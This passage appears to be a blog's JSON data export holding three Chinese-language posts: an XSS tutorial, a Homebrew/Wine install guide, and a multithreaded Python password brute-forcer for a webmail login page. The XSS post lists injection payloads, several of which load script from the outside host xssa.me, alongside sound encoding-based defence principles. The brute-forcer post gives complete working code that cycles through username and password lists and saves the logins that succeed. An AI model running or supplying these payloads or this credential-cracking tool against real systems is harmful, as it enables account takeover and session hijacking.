href=\"#XSS-Cheat-Sheet\" class=\"headerlink\" title=\"XSS Cheat Sheet\"></a>XSS Cheat Sheet</h3><p><a href=\"https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet\" target=\"_blank\" rel=\"external\">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a></p>\n<h3 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h3><ul>\n<li>《XSS跨站脚本 攻击剖析与防御》<a href=\"https://pan.baidu.com/s/1cwDUhg\" target=\"_blank\" rel=\"external\">PDF 百度云</a> (PS:书写的很一般，没必要买实体书，虽说我买了。)</li>\n<li><a href=\"http://www.freebuf.com/articles/web/9977.html\" target=\"_blank\" rel=\"external\">防御XSS的七条原则</a></li>\n<li><a href=\"https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet\" target=\"_blank\" rel=\"external\">XSS Filter Evasion Cheat Sheet</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"<blockquote>\n<p>  XSS(Cross Site Scripting)</p>\n<p>  用户输入超出开发者预期的数据，导致在网页中添加或修改页面代码，从而执行恶意操作。</p>\n</blockquote>\n<h3 id=\"XSS的分类\"><a href=\"#XSS的分类\" class=\"headerlink\" title=\"XSS的分类\"></a>XSS的分类</h3><ul>\n<li>反射型XSS</li>\n<li>持久型XSS</li>\n<li>DOM-based型XSS（客户端注入）</li></ul>","more":"\n\n<h3 id=\"XSS的危害\"><a href=\"#XSS的危害\" class=\"headerlink\" title=\"XSS的危害\"></a>XSS的危害</h3><ul>\n<li>Cookie资料窃取</li>\n<li>劫持用户会话</li>\n<li>广告弹窗</li>\n<li>网页挂马</li>\n<li>网站钓鱼</li>\n<li>按键记录</li>\n<li>…(JS能完成的任何功能)</li>\n</ul>\n<h3 id=\"XSS的构造\"><a href=\"#XSS的构造\" class=\"headerlink\" title=\"XSS的构造\"></a>XSS的构造</h3><ul>\n<li><h5 id=\"利用-lt-gt-标记注入HTML-JavaScript标签\"><a href=\"#利用-lt-gt-标记注入HTML-JavaScript标签\" class=\"headerlink\" title=\"利用&lt;&gt;标记注入HTML/JavaScript标签\"></a>利用&lt;&gt;标记注入HTML/JavaScript标签</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;script&gt;alert(1)&lt;/script&gt;</div><div class=\"line\"></div><div class=\"line\">&lt;sCRiPt sRC=http://xssa.me/EXgq&gt;&lt;/sCrIpT&gt;</div></pre></td></tr></table></figure>\n</li>\n<li><h5 id=\"利用HTML标签属性值执行XSS\"><a href=\"#利用HTML标签属性值执行XSS\" class=\"headerlink\" title=\"利用HTML标签属性值执行XSS\"></a>利用HTML标签属性值执行XSS</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;a href=&quot;javascript:alert(1)&quot;&gt;click me&lt;/a&gt;</div><div class=\"line\"></div><div class=\"line\">...除href/src外的其它类似属性</div></pre></td></tr></table></figure>\n</li>\n<li><h5 id=\"在HTML标签中注入事件\"><a href=\"#在HTML标签中注入事件\" class=\"headerlink\" title=\"在HTML标签中注入事件\"></a>在HTML标签中注入事件</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;img src=x onerror=&quot;javascript:alert(/XSS/)&quot;&gt;</div><div class=\"line\"></div><div class=\"line\">&lt;img src=logo.png onload=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://xssa.me/EXgq&apos;;&gt;</div><div class=\"line\"></div><div class=\"line\">&lt;input onfocus=a=&apos;scr&apos;;s=createElement(a+&apos;ipt&apos;);body.appendChild(s);s.src=&apos;http://xssa.me/EXgq&apos;; autofocus&gt;</div><div class=\"line\"></div><div class=\"line\">...各种on事件</div></pre></td></tr></table></figure>\n</li>\n<li><h5 id=\"利用CSS跨站\"><a href=\"#利用CSS跨站\" class=\"headerlink\" title=\"利用CSS跨站\"></a>利用CSS跨站</h5><blockquote>\n<p>  尝试多种样式表(css),均无效。原因未知</p>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"XSS的变形\"><a href=\"#XSS的变形\" class=\"headerlink\" title=\"XSS的变形\"></a>XSS的变形</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;sCRiPt/SrC=//xssa.me/EXgq&gt;</div><div class=\"line\"></div><div class=\"line\">&lt;ScRiPt/**/src=http://xssa.me/EXgq&gt;&lt;/ScRiPt&gt;</div><div class=\"line\"></div><div class=\"line\">&lt;img src=1 onerror=$.get(&apos;http://xssa.me/EXgq&apos;)&gt;      (jquery)</div><div class=\"line\"></div><div class=\"line\">eval($.get(&apos;http://xssa.me/EXgq&apos;))            (jquery)</div><div class=\"line\"></div><div class=\"line\">&lt;svg/onload=document.body.appendChild(document.createElement(/script/.source)).src=&apos;http://xssa.me/EXgq&apos;</div></pre></td></tr></table></figure>\n<h3 id=\"XSS的防御\"><a href=\"#XSS的防御\" class=\"headerlink\" title=\"XSS的防御\"></a>XSS的防御</h3><p>原则1：不要在页面中插入任何不可信数据，除非这些数已经据根据下面几个原则进行了编码</p>\n<p>原则2：在将不可信数据插入到HTML标签之间时，对这些数据进行HTML Entity编码</p>\n<p><strong>HTML Entity编码</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">&amp;     –&gt;     &amp;amp;</div><div class=\"line\">&lt;     –&gt;     &amp;lt;</div><div class=\"line\">&gt;     –&gt;     &amp;gt;</div><div class=\"line\">”     –&gt;     &amp;quot;</div><div class=\"line\">‘     –&gt;     &amp;#x27;</div><div class=\"line\">/     –&gt;     &amp;#x2f;</div></pre></td></tr></table></figure></p>\n<p>原则3：在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码</p>\n<blockquote>\n<p>  除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 &#xHH; （以&amp;#x开头，HH则是指该字符对应的十六进制数字，分号作为结束符）</p>\n<p>  之所以编码规则如此严格，是因为开发者有时会忘记给属性的值部分加上引号。如果属性值部分没有使用引号的话，攻击者很容易就能闭合掉当前属性，随后即可插入攻击脚本。例如，如果属性没有使用引号，又没有对数据进行严格编码，那么一个空格符就可以闭合掉当前属性。</p>\n<p>  除了空格符可以闭合当前属性外，这些符号也可以：<br>%     *     +     ,     –     /     ;     &lt;     =     &gt;     ^     |     `(反单引号，IE会认为它是单引号)</p>\n</blockquote>\n<p>原则4：在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码</p>\n<blockquote>\n<p>  除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 \\xHH （以 \\x 开头，HH则是指该字符对应的十六进制数字</p>\n<p>  在对不可信数据做编码的时候，千万不能图方便使用反斜杠（ \\ ）对特殊字符进行简单转义，比如将双引号 ” 转义成 \\” ，这样做是不可靠的，因为浏览器在对页面做解析的时候，会先进行HTML解析，然后才是JavaScript解析，所以双引号很可能会被当做HTML字符进行HTML解析，这时双引号就可以突破代码的值部分，使得攻击者可以继续进行XSS攻击。</p>\n</blockquote>\n<p>原则5：在将不可信数据插入到Style属性里时，对这些数据进行CSS编码</p>\n<blockquote>\n<p>  除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 \\HH （以 \\ 开头，HH则是指该字符对应的十六进制数字）</p>\n</blockquote>\n<p>原则6：在将不可信数据插入到HTML URL里时，对这些数据进行URL编码</p>\n<blockquote>\n<p>  除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 %HH （以 % 开头，HH则是指该字符对应的十六进制数字）<br>  在对URL进行编码的时候，有两点是需要特别注意的：<br>  1) URL属性应该使用引号将值部分包围起来，否则攻击者可以很容易突破当前属性区域，插入后续攻击代码<br>  2) 不要对整个URL进行编码，因为不可信数据可能会被插入到href, src或者其他以URL为基础的属性里，这时需要对数据的起始部分的协议字段进行验证，否则攻击者可以改变URL的协议，例如从HTTP协议改为DATA伪协议，或者javascript伪协议。</p>\n</blockquote>\n<p>原则7：使用富文本时，使用XSS规则引擎进行编码过滤</p>\n<blockquote>\n<p>  针对富文本的特殊性，我们可以使用XSS规则引擎对用户输入进行编码过滤，只允许用户输入安全的HTML标签，如 b, i, p等，对其他数据进行HTML编码。需要注意的是，经过规则引擎编码过滤后的内容只能放在div, p等安全的HTML标签里，不要放到HTML标签的属性值里，更不要放到HTML事件处理属性里，或者放到SCRIPT标签里。</p>\n</blockquote>\n<h3 id=\"XSS-Cheat-Sheet\"><a href=\"#XSS-Cheat-Sheet\" class=\"headerlink\" title=\"XSS Cheat Sheet\"></a>XSS Cheat Sheet</h3><p><a href=\"https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet\">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a></p>\n<h3 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h3><ul>\n<li>《XSS跨站脚本 攻击剖析与防御》<a href=\"https://pan.baidu.com/s/1cwDUhg\">PDF 百度云</a> (PS:书写的很一般，没必要买实体书，虽说我买了。)</li>\n<li><a href=\"http://www.freebuf.com/articles/web/9977.html\">防御XSS的七条原则</a></li>\n<li><a href=\"https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet\">XSS Filter Evasion Cheat Sheet</a></li>\n</ul>"},{"title":"install homebrew and wine on mac","date":"2017-05-16T06:02:17.000Z","_content":"\n## wine安装\n```bash\n# 安装homebrew\n/usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"\n\n# 安装wine\nbrew install wine\n# 会提示wine: XQuartz is required to install this formula.X11Requirement unsatisfied!\n# 按照提示信息到https://xquartz.macosforge.org下载xquartz或者直接运行：\nbrew cask install xquartz\n<!-- more -->\n# 安装成功后，再次：\nbrew install wine\n\n# 检查wine 安装状态\nwine --version\n\n# 使用wine打开exe程序\nwine winfile.exe\n```\nbrew cask :: [http://caskroom.github.io](http://caskroom.github.io)\n\nXQuartz :: [https://www.xquartz.org](https://www.xquartz.org)","source":"_posts/install-homebrew-and-wine-on-mac.md","raw":"---\ntitle: install homebrew and wine on mac\ndate: 2017-05-16 14:02:17\ntags:\n---\n\n## wine安装\n```bash\n# 安装homebrew\n/usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"\n\n# 安装wine\nbrew install wine\n# 会提示wine: XQuartz is required to install this formula.X11Requirement unsatisfied!\n# 按照提示信息到https://xquartz.macosforge.org下载xquartz或者直接运行：\nbrew cask install xquartz\n<!-- more -->\n# 安装成功后，再次：\nbrew install wine\n\n# 检查wine 安装状态\nwine --version\n\n# 使用wine打开exe程序\nwine winfile.exe\n```\nbrew cask :: [http://caskroom.github.io](http://caskroom.github.io)\n\nXQuartz :: [https://www.xquartz.org](https://www.xquartz.org)","slug":"install-homebrew-and-wine-on-mac","published":1,"updated":"2017-06-08T13:14:38.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj9qrjfsp000o97uv4bfvmo6n","content":"<h2 id=\"wine安装\"><a href=\"#wine安装\" class=\"headerlink\" title=\"wine安装\"></a>wine安装</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 安装homebrew</span></div><div class=\"line\">/usr/bin/ruby <span class=\"_\">-e</span> <span class=\"string\">\"<span class=\"variable\">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)</span>\"</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 安装wine</span></div><div class=\"line\">brew install wine</div><div class=\"line\"><span class=\"comment\"># 会提示wine: XQuartz is required to install this formula.X11Requirement unsatisfied!</span></div><div class=\"line\"><span class=\"comment\"># 按照提示信息到https://xquartz.macosforge.org下载xquartz或者直接运行：</span></div><div class=\"line\">brew cask install xquartz</div><div class=\"line\">&lt;!-- more --&gt;</div><div class=\"line\"><span class=\"comment\"># 安装成功后，再次：</span></div><div class=\"line\">brew install wine</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 检查wine 安装状态</span></div><div class=\"line\">wine --version</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 使用wine打开exe程序</span></div><div class=\"line\">wine winfile.exe</div></pre></td></tr></table></figure>\n<p>brew cask :: <a href=\"http://caskroom.github.io\" target=\"_blank\" rel=\"external\">http://caskroom.github.io</a></p>\n<p>XQuartz :: <a href=\"https://www.xquartz.org\" target=\"_blank\" rel=\"external\">https://www.xquartz.org</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"wine安装\"><a href=\"#wine安装\" class=\"headerlink\" title=\"wine安装\"></a>wine安装</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 安装homebrew</span></div><div class=\"line\">/usr/bin/ruby <span class=\"_\">-e</span> <span class=\"string\">\"<span class=\"variable\">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)</span>\"</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 安装wine</span></div><div class=\"line\">brew install wine</div><div class=\"line\"><span class=\"comment\"># 会提示wine: XQuartz is required to install this formula.X11Requirement unsatisfied!</span></div><div class=\"line\"><span class=\"comment\"># 按照提示信息到https://xquartz.macosforge.org下载xquartz或者直接运行：</span></div><div class=\"line\">brew cask install xquartz</div><div class=\"line\">&lt;!-- more --&gt;</div><div class=\"line\"><span class=\"comment\"># 安装成功后，再次：</span></div><div class=\"line\">brew install wine</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 检查wine 安装状态</span></div><div class=\"line\">wine --version</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 使用wine打开exe程序</span></div><div class=\"line\">wine winfile.exe</div></pre></td></tr></table></figure>\n<p>brew cask :: <a href=\"http://caskroom.github.io\">http://caskroom.github.io</a></p>\n<p>XQuartz :: <a href=\"https://www.xquartz.org\">https://www.xquartz.org</a></p>\n"},{"title":"多线程爆破脚本(python3)","date":"2017-06-27T01:05:31.000Z","_content":">   起因，，，其实就是老板派的活，结合以前写过的脚本，略微完善了一下下，比较合适作为简单参考，找找代码感觉。本文也主要是解释说明代码。\n\n## 主要功能\n脚本使用了命令行解析工具：argparser，所以直接-h查看帮助。 \n\n关于这个库的使用，可以参考我之前写过的blog：[Python argparse模块详解](http://oddboy.cn/2017/06/Python-argparse模块详解/)\n\n```\n➜  pythonCode python3 BingoBF.py -h\n        .--.\n       |o_o |    ------------------\n       |:_/ |   < Author: Mr.Bingo >\n      //   \\ \\   ------------------\n     (|     | ) <    oddboy.cn     >\n    /'\\_   _/`\\  ------------------\n    \\___)=(___/\n\nusage: BingoBF [options]\n\nBrute Force 【https://mail.xxx.com] email's passwords.\n\noptional arguments:\n  -h, --help   show this help message and exit\n  -u USERNAME  username\n  -U USERLIST  usernames\n  -p PASSWORD  password\n  -P PWDLIST   passwords\n  -o OUTPUT    print results to file\n  -t THREAD    mutli threads, default 3 threads\n\n+---+\n```\n<!-- more -->\n## 代码解释\n```\n#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport logging\nimport argparse\nimport queue\nimport requests\nimport threading\nimport os\nimport time\nimport random\nfrom html.parser import HTMLParser\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\n\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n# disable InsecureRequestWarning\n# 由于目标站点使用的证书过期了，导致我在使用requests库请求时将verify设置为FALSE，同时配置了proxies(指向本地Burp)。而requests依赖的底层库urllib3总是报Warning，所以使用上面语句disable掉这个Warning。可以参考如下链接：\n# https://stackoverflow.com/questions/27981545/suppress-insecurerequestwarning-unverified-https-request-is-being-made-in-pytho\n\nlogging.basicConfig(level=logging.WARNING)       # 用logging,避免调试时满篇的print.（但本脚本中基本没怎么用。。。）\n\n# general settings\n\ntarget_url=\"https://mail.xxx.com/UserLogin.aspx\"\n\nwriteFileLock = threading.Lock()    # 创建文件锁，避免写文件冲突。\nthreadLock = threading.Lock()    #创建线程锁，避免对显示效果的影响。\n\n# 保存爆破结果\ndef saveFile(message,outfilePath):\n    with open(outfilePath, 'a+', encoding = 'utf8') as f:  # 以追加的方法结果写入文件\n        f.write(message[0]+\"\\t\")\n        f.write(message[1]+\"\\n\")\n\n# 自定义一个Exception类,用于显示自定义的异常。\nclass validcodeException(BaseException):\n    def __init__(self,mesg=\" @@@@@@@@@@@@@@@         valid code is wrong!!!!!!!\"):\n        print(mesg)\n\n# 解析响应报文，主要用户提取服务器响应回来的表单字段，顶好用的玩意儿。官方文档：https://docs.python.org/3.6/library/html.parser.html?highlight=htmlparser\nclass BruteParser(HTMLParser):\n    def __init__(self):\n        HTMLParser.__init__(self)\n        self.tag_results = {}\n\n    def handle_starttag(self, tag, attrs):\n        if tag == \"input\":\n            tag_name = None\n            tag_value = None\n            for name, value in attrs:\n                if name == \"name\":\n                    tag_name = value\n                if name == \"value\":\n                    tag_value = value\n            if (tag_name == \"__VIEWSTATE\") or (tag_name == \"__VIEWSTATEGENERATOR\") or (tag_name == \"__EVENTVALIDATION\"):\n                self.tag_results[tag_name] = tag_value\n\n# 核心实现类\nclass Bruter(object):\n    def __init__(self, threads,userList,pwdList,outfilePath):\n        self.user_q=userList\n        self.pwdlist=list(pwdList.queue)      # 对于每个用户名，密码列表需要重复使用，所以不合适用队列，故而转换为list。\n        self.threads=threads\n        self.outfilePath=outfilePath\n        print(\"Total %d(%d * %d) tries( %d threads)\"% (self.user_q.qsize()*len(self.pwdlist),self.user_q.qsize(),len(self.pwdlist),self.threads))\n\n    # 线程的创建与管理\n    def run_bruteforce(self):\n        thread_arr=[]       # 线程列表list\n        for i in range(self.threads):\n            t = threading.Thread(target=self.web_bruter)\n            thread_arr.append(t)            # 创建线程\n        for i in range(self.threads):\n            thread_arr[i].start()           # 开启线程\n        for i in range(self.threads):\n            thread_arr[i].join()            # 回归线程\n\n    # 核心方法\n    def web_bruter(self):\n        proxies = { \n            \"http\": \"http://127.0.0.1:8080\", \n            \"https\": \"https://127.0.0.1:8080\", \n        }       # Burpsuite的代理地址\n\n        # 初始化cookie以及hidden元素数据。\n        response = requests.get(target_url,proxies=proxies,verify=False)\n        cookie=response.cookies\n\n        # 解析异常表单字段\n        parser = BruteParser()\n        parser.feed(response.text)\n        post_tags = parser.tag_results\n        post_tags['cmdSubmit.x']=random.randint(1,47)       # 登录按钮图片 47x39像素\n        post_tags['cmdSubmit.y']=random.randint(1,39)\n\n        # 从队列中取需要爆破的用户名，在多线程中使用queue比较方便。\n        while not self.user_q.empty():\n            username = self.user_q.get().rstrip().decode(\"ascii\")\n            for password in self.pwdlist:\n                password=password.decode(\"ascii\")\n                post_tags[\"txtUsername\"]=username\n                post_tags[\"txtPassword\"]=password\n                \n                threadLock.acquire()    # 取得线程锁，使用线程锁，避免出现显示效果被打乱的情况。\n                # \\r将光标回退到行首（\\b回退一格）,实现原地覆盖。\n                print(\" \\b\\b\"*100,end=\"\")       # 退两格，清空一格。 实现清空。\n                print(\"\\rTrying: %15s : %15s  (%d users left)\" % (username,password, self.user_q.qsize()),end=\"\")\n                #time.sleep(2)          # 调试时使用的\n                threadLock.release()    # 释放线程锁\n                reqResult = requests.post(target_url,data=post_tags,cookies=cookie,allow_redirects=True,proxies=proxies,verify=False)\n\n                if (\"欢迎使用XXX邮件系统\" in reqResult.text):   # 爆破成功\n                    threadLock.acquire()    # 取得线程锁\n                    print(\" \\b\\b\"*100,end=\"\")\n                    print (\"\\r[*] -->  %15s\\t%15s\" % (username,password))   # 打印到窗口\n                    #time.sleep(2)\n                    threadLock.release()    # 释放线程锁\n                    if self.outfilePath is not None:    # 输出到文件\n                        # 获取文件锁\n                        writeFileLock.acquire()\n                        try:\n                            # 追加到文件\n                            saveFile((username,password),self.outfilePath)\n                        finally:\n                            # 释放锁\n                            writeFileLock.release()\n                    break   # 跳出当前循环，进行下一个用户名爆破\n                if (\"您输入的验证码不正确，请重新输入!\" in reqResult.text): # 验证码错误，抛出异常！\n                    raise validcodeException(\"验证码错误，需要检查代码！！！！☆☆☆☆☆☆☆\")\n                    exit    # 退出！ 理论上不会执行这一句。\n                # 由于该登陆点存在验证码失效的问题，所以按理不会出现验证码不准确的情况，故而，也没继续完善代码。 如有需要，可自行完善。\n\n                if  (\"对不起, 您输入的用户名或口令错误, 请重新输入。\" in reqResult.text):\n                    pass        # 占一个坑，没鸟用\n                pass\n\n                #time.sleep(2)\n# 读取文件，生成队列\ndef build_list(listFile):   \n    # read in the list file\n    fd = open(listFile, \"rb\")\n    raw_words = fd.readlines()\n    fd.close()\n\n    words = queue.Queue()\n\n    for word in raw_words:\n        word = word.rstrip()\n        words.put(word)\n    return words\n\n\ndef main():\n    headCharPic=\"\\r        .--.\\n       |o_o |    ------------------ \\n       |:_/ |   < Author: Mr.Bingo >\\n      //   \\ \\   ------------------ \\n     (|     | ) <    oddboy.cn     >\\n    /'\\_   _/`\\  ------------------\\n    \\___)=(___/\\n\"\n    print(headCharPic)\n    # 创建一个argparser解析器\n    parser=argparse.ArgumentParser(\n        prog=\"BingoBF\",\n        usage=\" %(prog)s [options] \",\n        description='Brute Force 【https://mail.xxx.com] email\\'s passwords.',\n        epilog=\"+---+\\n\"\n        )\n\n    groupUser = parser.add_mutually_exclusive_group(required=True)\n    groupUser.add_argument('-u',dest=\"username\",help=\"username\")\n    groupUser.add_argument('-U',dest='userList',help=\"usernames\")\n\n    groupPwd = parser.add_mutually_exclusive_group(required=True)\n    groupPwd.add_argument('-p',dest=\"password\",help=\"password\")\n    groupPwd.add_argument('-P',dest='pwdList',help=\"passwords\")\n\n    parser.add_argument('-o',dest='output',help=\"print results to file\")\n\n    parser.add_argument(\"-t\",dest=\"thread\",type=int,help=\"mutli threads, default 3 threads\",default=3)\n\n    args=parser.parse_args()    # 命令行参数解析\n    \n    if args.username is not None:\n        userList=list(args.username)\n    else:\n        userList = build_list(args.userList)\n    if args.password is not None:\n        pwdList=list(args.password)\n    else:\n        pwdList = build_list(args.pwdList)\n\n    outfilePath = None\n    if args.output is not None:\n        outfilePath = args.output\n        filePath,fileName=os.path.split(outfilePath)\n        if (filePath!=\"\") and (not os.path.exists(filePath)):\n            os.mikedirs(filePath)   # 若不存在这个目录则递归创建\n\n    if args.thread is not None:\n        user_thread=args.thread\n\n    bruter_obj = Bruter(user_thread,userList,pwdList,outfilePath)\n    bruter_obj.run_bruteforce()\n\nif __name__ == '__main__':\n    main()\n```\n## 调用sample\n```\n➜ ~ python3 BingoBF.py -U user.txt -P pwd.txt -o Outfile.txt\n```\n\n## 附赠\n命令行中显示的企鹅字符画是用一个叫cowsay的工具弄的，感兴趣自己百谷。","source":"_posts/多线程爆破脚本-python3.md","raw":"---\ntitle: 多线程爆破脚本(python3)\ndate: 2017-06-27 09:05:31\ntags: Python\n---\n>   起因，，，其实就是老板派的活，结合以前写过的脚本，略微完善了一下下，比较合适作为简单参考，找找代码感觉。本文也主要是解释说明代码。\n\n## 主要功能\n脚本使用了命令行解析工具：argparser，所以直接-h查看帮助。 \n\n关于这个库的使用，可以参考我之前写过的blog：[Python argparse模块详解](http://oddboy.cn/2017/06/Python-argparse模块详解/)\n\n```\n➜  pythonCode python3 BingoBF.py -h\n        .--.\n       |o_o |    ------------------\n       |:_/ |   < Author: Mr.Bingo >\n      //   \\ \\   ------------------\n     (|     | ) <    oddboy.cn     >\n    /'\\_   _/`\\  ------------------\n    \\___)=(___/\n\nusage: BingoBF [options]\n\nBrute Force 【https://mail.xxx.com] email's passwords.\n\noptional arguments:\n  -h, --help   show this help message and exit\n  -u USERNAME  username\n  -U USERLIST  usernames\n  -p PASSWORD  password\n  -P PWDLIST   passwords\n  -o OUTPUT    print results to file\n  -t THREAD    mutli threads, default 3 threads\n\n+---+\n```\n<!-- more -->\n## 代码解释\n```\n#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport logging\nimport argparse\nimport queue\nimport requests\nimport threading\nimport os\nimport time\nimport random\nfrom html.parser import HTMLParser\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\n\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n# disable InsecureRequestWarning\n# 由于目标站点使用的证书过期了，导致我在使用requests库请求时将verify设置为FALSE，同时配置了proxies(指向本地Burp)。而requests依赖的底层库urllib3总是报Warning，所以使用上面语句disable掉这个Warning。可以参考如下链接：\n# https://stackoverflow.com/questions/27981545/suppress-insecurerequestwarning-unverified-https-request-is-being-made-in-pytho\n\nlogging.basicConfig(level=logging.WARNING)       # 用logging,避免调试时满篇的print.（但本脚本中基本没怎么用。。。）\n\n# general settings\n\ntarget_url=\"https://mail.xxx.com/UserLogin.aspx\"\n\nwriteFileLock = threading.Lock()    # 创建文件锁，避免写文件冲突。\nthreadLock = threading.Lock()    #创建线程锁，避免对显示效果的影响。\n\n# 保存爆破结果\ndef saveFile(message,outfilePath):\n    with open(outfilePath, 'a+', encoding = 'utf8') as f:  # 以追加的方法结果写入文件\n        f.write(message[0]+\"\\t\")\n        f.write(message[1]+\"\\n\")\n\n# 自定义一个Exception类,用于显示自定义的异常。\nclass validcodeException(BaseException):\n    def __init__(self,mesg=\" @@@@@@@@@@@@@@@         valid code is wrong!!!!!!!\"):\n        print(mesg)\n\n# 解析响应报文，主要用户提取服务器响应回来的表单字段，顶好用的玩意儿。官方文档：https://docs.python.org/3.6/library/html.parser.html?highlight=htmlparser\nclass BruteParser(HTMLParser):\n    def __init__(self):\n        HTMLParser.__init__(self)\n        self.tag_results = {}\n\n    def handle_starttag(self, tag, attrs):\n        if tag == \"input\":\n            tag_name = None\n            tag_value = None\n            for name, value in attrs:\n                if name == \"name\":\n                    tag_name = value\n                if name == \"value\":\n                    tag_value = value\n            if (tag_name == \"__VIEWSTATE\") or (tag_name == \"__VIEWSTATEGENERATOR\") or (tag_name == \"__EVENTVALIDATION\"):\n                self.tag_results[tag_name] = tag_value\n\n# 核心实现类\nclass Bruter(object):\n    def __init__(self, threads,userList,pwdList,outfilePath):\n        self.user_q=userList\n        self.pwdlist=list(pwdList.queue)      # 对于每个用户名，密码列表需要重复使用，所以不合适用队列，故而转换为list。\n        self.threads=threads\n        self.outfilePath=outfilePath\n        print(\"Total %d(%d * %d) tries( %d threads)\"% (self.user_q.qsize()*len(self.pwdlist),self.user_q.qsize(),len(self.pwdlist),self.threads))\n\n    # 线程的创建与管理\n    def run_bruteforce(self):\n        thread_arr=[]       # 线程列表list\n        for i in range(self.threads):\n            t = threading.Thread(target=self.web_bruter)\n            thread_arr.append(t)            # 创建线程\n        for i in range(self.threads):\n            thread_arr[i].start()           # 开启线程\n        for i in range(self.threads):\n            thread_arr[i].join()            # 回归线程\n\n    # 核心方法\n    def web_bruter(self):\n        proxies = { \n            \"http\": \"http://127.0.0.1:8080\", \n            \"https\": \"https://127.0.0.1:8080\", \n        }       # Burpsuite的代理地址\n\n        # 初始化cookie以及hidden元素数据。\n        response = requests.get(target_url,proxies=proxies,verify=False)\n        cookie=response.cookies\n\n        # 解析异常表单字段\n        parser = BruteParser()\n        parser.feed(response.text)\n        post_tags = parser.tag_results\n        post_tags['cmdSubmit.x']=random.randint(1,47)       # 登录按钮图片 47x39像素\n        post_tags['cmdSubmit.y']=random.randint(1,39)\n\n        # 从队列中取需要爆破的用户名，在多线程中使用queue比较方便。\n        while not self.user_q.empty():\n            username = self.user_q.get().rstrip().decode(\"ascii\")\n            for password in self.pwdlist:\n                password=password.decode(\"ascii\")\n                post_tags[\"txtUsername\"]=username\n                post_tags[\"txtPassword\"]=password\n                \n                threadLock.acquire()    # 取得线程锁，使用线程锁，避免出现显示效果被打乱的情况。\n                # \\r将光标回退到行首（\\b回退一格）,实现原地覆盖。\n                print(\" \\b\\b\"*100,end=\"\")       # 